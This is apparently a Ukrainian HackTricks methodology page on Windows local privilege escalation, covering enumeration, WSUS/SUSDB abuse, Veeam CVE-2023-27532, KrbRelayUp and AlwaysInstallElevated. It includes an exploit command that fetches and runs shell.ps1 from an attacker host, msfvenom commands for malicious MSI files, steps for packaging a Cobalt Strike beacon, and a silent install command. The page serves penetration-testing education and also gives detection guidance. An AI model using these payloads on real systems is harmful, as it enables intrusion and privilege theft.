# Ескалація локальних привілеїв Windows

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку векторів ескалації локальних привілеїв Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

На цій сторінці зібрано загальну методологію ескалації привілеїв у Windows із кількох базових посібників.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Практичний порядок перерахування також спирається на воркшопи й чеклісти спільноти.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Історичний матеріал про атаки містить презентацію DerbyCon про ескалацію привілеїв у Windows.<sup>[[5]](#references)</sup>

## Основи Windows

### Токени доступу

**Якщо ви не знаєте, що таке токени доступу Windows, перш ніж продовжити, прочитайте цю сторінку:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL — DACL/SACL/ACE

**Докладніше про ACL — DACL/SACL/ACE — читайте на цій сторінці:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Рівні цілісності

**Якщо ви не знаєте, що таке рівні цілісності у Windows, перш ніж продовжити, прочитайте цю сторінку:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Засоби безпеки Windows

У Windows є різні засоби, які можуть **завадити вам перераховувати систему**, запускати виконувані файли або навіть **виявляти ваші дії**. Перш ніж починати перерахування для ескалації привілеїв, слід **прочитати** цю **сторінку** й **перевірити** всі ці **механізми захисту**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Фізичний доступ також дає змогу перетворити офлайнове редагування UEFI NVRAM на ланцюжок атак із DMA до завантаження та модифікацією пам’яті Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / приховане підвищення привілеїв через UIAccess

Процеси UIAccess, запущені через `RAiLaunchAdminProcess`, можна використати для отримання High IL без запитів підтвердження, якщо обійти перевірки безпечного шляху AppInfo. Описаний тут спеціалізований процес обходу UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Поширення параметрів реєстру доступності Secure Desktop можна використати для довільного запису в реєстр від імені SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

У новіших збірках Windows також з’явився шлях LPE через **SMB arbitrary-port**, за якого привілейована локальна NTLM-автентифікація відображається через повторно використане TCP-з’єднання SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Інформація про систему

### Перерахування відомостей про версію

Перевірте, чи є відома вразливість у цій версії Windows (також перевірте встановлені виправлення).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Експлойти для конкретних версій

Цей [сайт](https://msrc.microsoft.com/update-guide/vulnerability) стане в пригоді для пошуку детальної інформації про вразливості безпеки Microsoft. У цій базі даних міститься понад 4 700 вразливостей, що демонструє **величезну поверхню атаки**, яку створює середовище Windows.

**У системі**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas має вбудований watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — збирає дані про збірку ОС, встановлені оновлення та потенційно відповідні рекомендації; перш ніж вважати результат застосовним, перевірте точний продукт і оновлення, що замінюють попередні.

Для локального експлойту, призначеного для конкретної версії, перевірте **архітектуру запущеного процесу**, а також архітектуру ОС. У 64-бітній Windows для 32-бітного процесу діє [перенаправлення файлової системи WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` зазвичай вказує на 32-бітний системний каталог, тоді як `%windir%\Sysnative` дає цьому процесу доступ до системного каталогу нативної архітектури. Для 64-бітного процесу цей псевдонім недоступний. Збірка ОС або кандидат на відсутнє оновлення KB не доводять, що система вразлива до експлойту; зіставте поточну збірку, встановлене оновлення або оновлення, що його замінює, архітектуру процесу та передумови експлойту з [бюлетенем безпеки Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) для конкретної проблеми.

Приклад пошкодження пам’яті служби див. у розділі про [зміщення в кільцевому буфері спільної пам’яті MIDI, контрольовані клієнтом](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Опубліковані зміщення стека стосуються лише перевіреної збірки; отримання прав `LOCAL SERVICE` — це окремий крок від подальшого [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md), що дає права `SYSTEM`.<sup>[[44]](#references)</sup>

**Локально, використовуючи інформацію про систему**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Репозиторії експлойтів на Github:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Середовище

У змінних середовища збережено якісь облікові дані/Juicy-інформацію?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Історія PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Файли транскриптів PowerShell

Дізнатися, як увімкнути цю функцію, можна тут: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` — лише приклад. [Політика транскрибування PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) зазвичай зберігає файли в папці Documents кожного користувача, але параметр `OutputDirectory` або команда `Start-Transcript -OutputDirectory` можуть перенаправити файли до спільної чи прихованої папки. Перш ніж переглядати транскрипт, перевірте фактичний шлях збереження та ACL файлу: він може містити аргументи команд і вивід, зокрема облікові дані. Доступний для читання транскрипт — лише зачіпка, якщо його вміст розкриває придатні для використання облікові дані користувача з вищими привілеями, а цей користувач може ввійти в систему у відповідному контексті.

### PowerShell Module Logging

Записуються відомості про виконання команд PowerShell у конвеєрі, зокрема виконані команди, виклики команд і частини скриптів. Однак повні відомості про виконання та результати виводу можуть не фіксуватися.

Щоб увімкнути цю функцію, дотримуйтеся інструкцій у розділі документації "Transcript files" і виберіть **"Module Logging"** замість **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Щоб переглянути останні 15 подій із журналів PowerShell, можна виконати:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Фіксується повна активність і весь вміст виконання скрипту, що забезпечує документування кожного блоку коду під час його виконання. Цей процес зберігає вичерпний журнал аудиту всіх дій, цінний для цифрової криміналістики та аналізу зловмисної поведінки. Документування всіх дій під час виконання дає змогу отримати детальне уявлення про процес.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Події журналювання блоків сценаріїв можна знайти в Windows Event Viewer за шляхом: **Журнали програм і служб > Microsoft > Windows > PowerShell > Operational**.\
Щоб переглянути останні 20 подій, можна скористатися:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Налаштування Інтернету

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Диски

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

У попередніх рекомендаціях ризик підсумовано так:

Систему можна скомпрометувати, якщо оновлення запитуються через http, а не http**S**.

Кінцева точка WSUS через HTTP — це підстава перевірити можливість перехоплення метаданих оновлень. Експлуатація також залежить від того, чи використовує клієнт цей сервер WSUS, чи може зловмисник перехоплювати або контролювати його трафік, а також від політики довіри до оновлень та їх установлення на клієнті. Сам URL не свідчить про можливість виконання коду. [Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Спочатку перевірте, чи використовує мережа оновлення WSUS без SSL, виконавши в cmd таку команду:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Або наступне в PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Якщо ви отримаєте відповідь на кшталт однієї з наведених:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

А якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` або `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` дорівнює `1`.

Початкове твердження про застосовність було таким:

Тоді **це можна експлуатувати.** Якщо значення останнього параметра реєстру дорівнює `0`, запис WSUS буде проігноровано.

Коли `UseWUServer` дорівнює `1`, Windows Update використовує налаштовану внутрішню службу. Це підтверджує передумову для перехоплення HTTP-трафіку, але не доводить, що перехоплення, прийняття шкідливого оновлення або його встановлення з підвищеними привілеями можливі. Коли значення дорівнює `0`, ця конкретна кінцева точка WSUS, налаштована цією політикою, не вибирається.

Для експлуатації цих вразливостей можна скористатися такими інструментами, як [Wsuxploit](https://github.com/pimps/wsuxploit) і [pyWSUS ](https://github.com/GoSecure/pywsus). Це скрипти для MiTM-атак, призначені для впровадження «підроблених» оновлень у незашифрований SSL-трафік WSUS.

Дослідження можна прочитати тут:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Повний звіт можна прочитати тут**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
По суті, ось у чому полягає вразливість:

> Якщо ми можемо змінювати проксі-сервер для локального користувача, а Windows Updates використовує проксі-сервер, налаштований у параметрах Internet Explorer, то можемо локально запустити [PyWSUS](https://github.com/GoSecure/pywsus), перехопити власний трафік і виконати код із підвищеними привілеями на нашому комп’ютері.
>
> Крім того, оскільки служба WSUS використовує параметри поточного користувача, вона також використовує його сховище сертифікатів. Якщо створити самопідписаний сертифікат для імені хоста WSUS і додати його до сховища сертифікатів поточного користувача, можна перехоплювати трафік WSUS як через HTTP, так і через HTTPS. У WSUS немає механізмів на кшталт HSTS для реалізації перевірки сертифіката за принципом trust-on-first-use. Якщо сертифікат, який надається, є довіреним для користувача та має правильне ім’я хоста, служба його прийме.

Цю вразливість можна експлуатувати за допомогою інструмента [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (після його оприлюднення).

### Оновлення WSUS, контрольовані адміністратором

Окремий шлях можливий, якщо поточна ідентичність може **публікувати та затверджувати** оновлення на сервері WSUS. Перевірте фактичне членство в групі сервера `WSUS Administrators` і будь-які делеговані дозволи WSUS, а потім визначте групу клієнтських комп’ютерів, якій буде призначено затверджене оновлення. [Microsoft вимагає прав адміністратора WSUS для затвердження оновлень](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) і [документує зв’язок довіри для публікації](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): клієнти мають довіряти сертифікату підпису, використаному для локально опублікованого вмісту. Перш ніж вважати це шляхом підвищення привілеїв, переконайтеся, що кандидатне оновлення підписане й приймається, застосовне до цільової системи та встановлюється в контексті з вищими привілеями. Саме лише значення HTTP `WUServer` або назва групи не підтверджують виконання цих умов.

### Зловживання користувацькими оновленнями SUSDB: непідписані корисні навантаження через `.txt`/`.esd`

Це порушення межі довіри відрізняється від перехоплення HTTP-з’єднання WSUS: передумова — достатній доступ до **збережених процедур бази даних WSUS (`SUSDB`)**, щоб публікувати й затверджувати користувацьке оновлення. Один із практичних способів отримати такий доступ — перенаправити обліковий запис комп’ютера upstream-сервера WSUS на окремий сервер MSSQL, де розміщено `SUSDB`. Точна передумова залежить від розгортання, тому спершу перевірте дозволи `EXECUTE`, а не припускайте наявність прав адміністратора SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Опис окремого шляху атаки, за якого автентифікація клієнта WSUS перенаправляється з HTTP/8530 до LDAP, SMB або AD CS, див. у розділі [Зловживання HTTP WSUS для NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Перевірка relay до зовнішньої бази даних і прав на процедури

У розгортаннях, де WSUS використовує зовнішній SQL Server, спершу перевірте, чи може обліковий запис сервера WSUS автентифікуватися в базі даних і чи доходить NTLM relay до цього сервера. Роль SQL сервера може надавати доступ до процедур публікації оновлень, навіть якщо прямий запис у таблиці заборонений; невдала команда `UPDATE` для `SUSDB` не доводить, що публікацію заблоковано. Перш ніж намагатися опублікувати користувацьке оновлення, перевірте ефективну ідентичність, членство в ролях і дозволи на процедури в авторизованому сеансі SQL.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Визначення процедур у системі та встановлений файл `SoftwareDistributionPackage.xsd` корисні для відтворення коректних метаданих оновлення. Для батьківського bundle та дочірнього payload потрібні `UpdateIdentity` (тип фрагмента `1`), `LocalizedProperties` (`4`) і `ExtendedProperties` (`2`); зберігайте локальний ідентифікатор ревізії, який повертає кожен виклик `spImportUpdate`, і стежте за узгодженістю зв’язку bundle, digest-ів, розміру, URL вмісту та ревізії. Це stateful workflow публікації, тому один успішний виклик stored procedure не є доказом виконання на боці клієнта.<sup>[[38]](#references)</sup>

#### Створення, призначення та схвалення оновлення

Workflow користувацького оновлення використовує легітимні процедури WSUS як обмежений API публікації. Важливі переходи станів:<sup>[[38]](#references)</sup>

| Етап | Відповідні stored procedures |
| --- | --- |
| Імпортувати метадані оновлення | `spImportUpdate` |
| Зберегти фрагменти XML prerequisite, локалізованих і розширених властивостей | `spSaveXMLFragment` |
| Пов’язати digest вмісту з контрольованим атакувальником URL | `spSetBatchURL` |
| Перелічити/створити групу комп’ютерів і додати клієнта | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Схвалити встановлення для цієї групи | `spDeployUpdate` з `@actionID = 0` і `@isAssigned = 1` |

Ім’я файлу, digest-и, розмір і обробник `CommandLineInstallation` мають узгоджуватися в імпортованих метаданих/фрагментах. Після призначення URL вмісту та цільової групи фінальне схвалення має такий вигляд; використовуйте нові ідентифікатори оновлення, групи та розгортання, а не повторно використовуйте приклади GUID.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Обхід перевірки підпису через розширення

WSUS зазвичай відхиляє довільний непідписаний виконуваний вміст. Однак у `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` шлях .NET `VerifyFile` встановлює прапорець перевірки сертифіката в значення false, якщо надане ім’я файлу закінчується на `.txt` або `.esd`; тоді `CheckCertificateSignature` пропускається без попередньої перевірки, чи є байти текстом або справжнім образом ESD. Тому незмінений PE-файл, названий, наприклад, `payload.exe.txt`, може пройти перевірку вмісту, а згодом бути запущеним обробником інсталяції оновлення з командного рядка. Це помилка плутанини типів/політик, а не підроблення підпису.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging і автоматизація, сумісні з BITS

Виклик `spDeployUpdate` змушує WSUS отримати зареєстрований вміст. Джерело має відповідати вимогам BITS до HTTP: доступного URL недостатньо, оскільки передавання використовує початковий потік `HEAD`/`GET` і запити діапазонів байтів. Сервер без підтримки Range спричиняє подію синхронізації WSUS `EventId=364` із повідомленням, що BITS вимагає заголовок протоколу Range.<sup>[[39]](#references)</sup>

Дослідницький PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) генерує SQL, потрібний для ланцюжка імпорту/фрагмента/URL/групи/розгортання, містить модифікований клієнт MSSQL для його виконання та постачається зі скриптом `BitsWebServer.py` для розміщення вмісту. Мінімальний приклад запуску в авторизованій лабораторії:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Виконання без участі користувача та persistence через повторні спроби

Взаємодія на стороні клієнта залежить від політики. Параметр `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, опція `4 - Auto download and schedule install`, забезпечує завантаження та встановлення схваленого оновлення за налаштованим розкладом без ручного вибору користувачем. Під час тестування payload, оновлення якого залишалося невдалим/незавершеним, знову пропонувався відразу після завершення процесу callback, тож поведінка повторних спроб може перетворитися на persistence через регулярне виконання; це помітно, оскільки клієнт показує стан невдалого оновлення.<sup>[[39]](#references)</sup>

#### Напрями виявлення та посилення захисту

Корисні напрями перевірки на стороні сервера та клієнта для цього ланцюжка:<sup>[[39]](#references)</sup>

- Перевіряйте в `SUSDB` виконання `spCreateTargetGroup`, `spSetBatchURL` і `spDeployUpdate`; розслідуйте появу нових груп цільових пристроїв, зовнішніх джерел вмісту, payload оновлень `.txt`/`.esd` і розгортань, виконаних неочікуваними принципалами (особливо обліковими записами, що не є обліковими записами комп’ютерів).
- Перевіряйте `C:\Program Files\Update Services\LogFiles` на наявність `ContentSyncAgent`, `FileVerified`, помилково написаного `FileVerficationFailed` і `EventId=364`; зіставляйте результати перевірки з розширенням payload і сигнатурою вмісту, а не покладайтеся на розширення файлу.
- Шукайте випадки повторних невдалих спроб встановлення Windows Update, а також виконання PE чи неочікувану активність дочірніх процесів/мережі з вмісту, що має назви `.txt` або `.esd`.
- Якщо це підтримується, вимагайте Extended Protection for Authentication для служби бази даних і обмежте мережевий доступ до бази даних сервером WSUS та авторизованими адміністративними системами. Зведіть до мінімуму права `EXECUTE` для процедур користувацьких оновлень і проводьте їх аудит.

## Сторонні автооновлювачі та IPC агентів (локальне підвищення привілеїв)

Багато корпоративних агентів надають IPC-інтерфейс localhost і привілейований канал оновлення. Якщо реєстрацію можна спрямувати на сервер зловмисника, а автооновлювач довіряє неавторитетному кореневому CA або має слабкі перевірки підпису, локальний користувач може доставити шкідливий MSI, який встановить служба SYSTEM. Узагальнену техніку (на основі ланцюжка Netskope stAgentSvc — CVE-2025-0309) наведено тут:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM через TCP 9401)

Початковий опис для конкретної версії та примітка щодо розвідки:

Veeam B&R < `11.0.1.1261` відкриває службу localhost на **TCP/9401**, яка обробляє контрольовані зловмисником повідомлення та дає змогу виконувати довільні команди від імені **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: перевірте наявність слухача та версію, наприклад, за допомогою `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication і Cloud Connect за замовчуванням використовують основну службу резервного копіювання на **TCP/9401**. [У рекомендації Veeam](https://www.veeam.com/kb4424) описано неавтентифіковане розкриття зашифрованих облікових даних бази конфігурації в межах периметра мережі резервного копіювання; окремий публічний PoC демонструє шлях до виконання команд від імені **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Служба може прив’язуватися не лише до localhost, тож перевірте фактичну адресу та PID.

- **Recon**: переконайтеся, що TCP/9401 належить `Veeam.Backup.Service.exe`, а потім перевірте встановлений продукт і метадані виправлень. `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` є підказками, а не повною перевіркою наявності виправлень.
- **Перші виправлені версії**: Veeam зазначає **11a build 11.0.1.1261 P20230227** і **12 build 12.0.0.1420 P20230223** як перші виправлені випуски; попередні випуски вразливі. Чотирикомпонентний номер версії файлу сам по собі не дає змоги відрізнити невиправлену базову збірку від пізнішого виправлення для тих самих номерів збірок. Перш ніж вважати граничну збірку виправленою, перевірте ідентифікатор виправлення за [історією збірок постачальника](https://www.veeam.com/kb2680).
- **Exploit**: помістіть PoC, наприклад `VeeamHax.exe`, разом із потрібними DLL Veeam в один каталог, а потім запустіть SYSTEM payload через локальний сокет:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Служба виконує команду від імені SYSTEM.

У наведеному PoC показано виконання команд від імені SYSTEM за наявності додаткових передумов; в advisory постачальника описано проблему розкриття облікових даних.

## KrbRelayUp

Початковий опис середовища зі стандартними налаштуваннями був таким:

У середовищах Windows **domain** за певних умов існує вразливість **локального підвищення привілеїв**. До цих умов належать середовища, де **підписування LDAP не вимагається**, користувачі мають права self-rights, що дозволяють їм налаштовувати **Resource-Based Constrained Delegation (RBCD)**, а також можуть створювати комп’ютери в домені. Важливо зазначити, що ці **вимоги** виконуються за **стандартних налаштувань**.

Локальний Kerberos relay може перейти від входу користувача з нижчими привілеями до привілейованого запису в directory, якщо відповідний COM server автентифікується, а ретрансльований principal має права на цільовий об’єкт. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) як записи LDAP для RBCD, так і для `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp автоматизує деякі з цих шляхів. Для ланцюжка RBCD потрібні відповідні права делегування та права на цільовий об’єкт, а для ланцюжка shadow-credential — права на запис ключових облікових даних і KDC, що підтримує шлях автентифікації за сертифікатом. Жоден із цих шляхів не випливає лише з членства в домені.

Перевірте політику фактичного DC щодо [підписування LDAP](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) і [прив’язування каналу LDAPS](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL об’єкта для ретрансльованої особи, а також рівні автентифікації та імперсонації вибраного COM class. Мають значення тип входу користувача та контекст облікових даних: сеанс WinRM може поводитися інакше, ніж інтерактивний вхід або вхід із новими обліковими даними. Результат також можуть змінити правила маршрутизації firewall/OXID та встановлені оновлення. Вважайте дозвільну політику або відповідний ACL приводом для перевірки; пасивне перерахування не повинно запускати COM coercion, relay-автентифікацію чи записи в directory. Shadow credential облікового запису комп’ютера може дати змогу отримати machine ticket і, лише якщо цей обліковий запис має необхідні права реплікації directory, перейти до окремого шляху DCSync.

Знайдіть **exploit у** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Щоб дізнатися більше про перебіг атаки, див. [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Якщо** ці 2 параметри реєстру **увімкнені** (значення — **0x1**), користувачі з будь-якими привілеями можуть **встановлювати** (виконувати) файли `*.msi` від імені NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Якщо у вас є сесія meterpreter, ви можете автоматизувати цю техніку за допомогою модуля **`exploit/windows/local/always_install_elevated`**

### PowerUP

Використайте команду `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі двійковий файл Windows MSI для підвищення привілеїв. Цей скрипт створює попередньо скомпільований інсталятор MSI, який пропонує додати користувача/групу (тому вам знадобиться доступ до GIU):

```
Write-UserAddMSI
```

Просто запустіть створений бінарний файл, щоб підвищити привілеї.

### MSI Wrapper

Прочитайте цей посібник, щоб дізнатися, як створити MSI wrapper за допомогою цих інструментів. Зверніть увагу: можна загорнути файл "**.bat**", якщо потрібно **лише** виконати **командні рядки**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Створення MSI за допомогою WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Створення MSI за допомогою Visual Studio

- **Згенеруйте** за допомогою Cobalt Strike або Metasploit **новий Windows EXE TCP payload** у `C:\privesc\beacon.exe`
- Відкрийте **Visual Studio**, виберіть **Create a new project** і введіть "installer" у поле пошуку. Виберіть проєкт **Setup Wizard** і натисніть **Next**.
- Укажіть назву проєкту, наприклад **AlwaysPrivesc**, виберіть для розташування **`C:\privesc`**, позначте **place solution and project in the same directory** і натисніть **Create**.
- Продовжуйте натискати **Next**, доки не дійдете до кроку 3 із 4 (вибір файлів для включення). Натисніть **Add** і виберіть щойно згенерований Beacon payload. Потім натисніть **Finish**.
- Виберіть проєкт **AlwaysPrivesc** у **Solution Explorer**, а в розділі **Properties** змініть **TargetPlatform** з **x86** на **x64**.
  - Можна змінити й інші властивості, наприклад **Author** і **Manufacturer**, щоб установлена програма виглядала легітимніше.
- Клацніть правою кнопкою миші проєкт і виберіть **View > Custom Actions**.
- Клацніть правою кнопкою миші **Install** і виберіть **Add Custom Action**.
- Двічі клацніть **Application Folder**, виберіть файл **beacon.exe** і натисніть **OK**. Це забезпечить запуск Beacon payload одразу після запуску інсталятора.
- У розділі **Custom Action Properties** змініть **Run64Bit** на **True**.
- Нарешті, **зіберіть проєкт**.
  - Якщо з’явиться попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що платформу встановлено на x64.

### Встановлення MSI

Щоб виконати **встановлення** шкідливого файлу `.msi` у **фоновому режимі:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Щоб експлуатувати цю вразливість, можна використати: _exploit/windows/local/always_install_elevated_

## Антивіруси та засоби виявлення

### Налаштування аудиту

